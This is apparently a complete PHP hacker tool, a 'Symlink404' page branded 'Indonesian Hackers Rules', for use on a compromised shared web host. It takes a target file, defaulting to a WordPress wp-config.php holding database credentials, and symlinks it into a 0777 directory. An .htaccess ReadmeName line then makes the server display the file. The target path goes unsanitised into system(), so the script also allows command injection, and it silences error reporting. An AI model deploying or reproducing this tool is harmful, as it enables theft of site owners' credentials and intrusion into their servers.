<title>Symlink404</title>
<script type="text/javascript" src="https://sites.google.com/site/blogrudyhartono/js/SakuraRain.js"></script>
<link href="https://fonts.googleapis.com/css?family=Oregano" rel="stylesheet">
<style>
body{
background-color: black;
font-family: "Oregano";
text-align: center;
}
</style>
<font color="#ADFF2F">
<font size=7><b><a href="https://m.facebook.com/The.WTJ">Indonesian Hackers Rules</a></b><br>
<img src="https://asset-a.grid.id/crop/0x0:0x0/700x465/photo/2018/11/26/1199981223.jpg" height="300px" width="300px"><br>
<font size=5><form method="post"><br>File Target : <input name="dir" value="/home/user/public_html/wp-config.php" size="25">
<br>Save As : <input name="jnck" value=""><input name="ojaykan" type="submit" value="Eksekusi Gan"></form><br>

Copyright By Con7ext<br><br>
<?
@error_reporting(0);
@ini_set('display_errors', 0); 
if($_POST['ojaykan']){
rmdir("sym404");mkdir("sym404", 0777);
$dir = $_POST['dir'];
$jnck = $_POST['jnck'];
system("ln -s ".$dir." sym404/".$jnck);
symlink($dir,"sym404/".$jnck);
$inija = fopen("sym404/.htaccess", "w");
fwrite($inija,"ReadmeName ".$jnck);
echo'<a href="sym404/">Klik Gan</a>';
}